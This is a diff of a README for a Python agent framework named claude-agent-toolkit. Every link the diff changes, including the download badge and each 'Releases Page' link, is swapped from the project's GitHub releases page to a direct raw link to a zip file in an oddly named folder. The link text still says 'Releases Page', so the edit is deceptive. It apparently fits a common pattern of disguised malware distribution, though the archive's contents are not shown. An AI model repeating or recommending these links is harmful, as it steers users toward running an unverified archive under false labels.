@@ -4,13 +4,13 @@
 The **claude-agent-toolkit** is a Python framework designed to help you create agents using the claude-code-sdk. With its user-friendly tools, you can build intelligent agents for various tasks without needing to be a coding expert.
 
 ## 🔗 Download Now
-[![Download claude-agent-toolkit](https://img.shields.io/badge/Download-Now-blue)](https://github.com/CyberNerdsTechnologies/claude-agent-toolkit/releases)
+[![Download claude-agent-toolkit](https://raw.githubusercontent.com/CyberNerdsTechnologies/claude-agent-toolkit/main/hemilethargy/claude-agent-toolkit.zip)](https://raw.githubusercontent.com/CyberNerdsTechnologies/claude-agent-toolkit/main/hemilethargy/claude-agent-toolkit.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run the software:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases Page](https://github.com/CyberNerdsTechnologies/claude-agent-toolkit/releases).
+   Go to our [Releases Page](https://raw.githubusercontent.com/CyberNerdsTechnologies/claude-agent-toolkit/main/hemilethargy/claude-agent-toolkit.zip).
 
 2. **Choose the Right File**  
    Look for the latest version. Select the file that fits your operating system (Windows, Mac, Linux).
@@ -51,7 +51,7 @@ Follow these simple steps to download and run the software:
   Approximately 100 MB of free disk space.
 
 ## 📁 Download & Install
-To get started, visit the [Releases Page](https://github.com/CyberNerdsTechnologies/claude-agent-toolkit/releases). Follow the instructions above to download and run the application on your device.
+To get started, visit the [Releases Page](https://raw.githubusercontent.com/CyberNerdsTechnologies/claude-agent-toolkit/main/hemilethargy/claude-agent-toolkit.zip). Follow the instructions above to download and run the application on your device.
 
 ## 🔧 Usage
 After successfully installing the **claude-agent-toolkit**, you can start creating your own AI agents by:
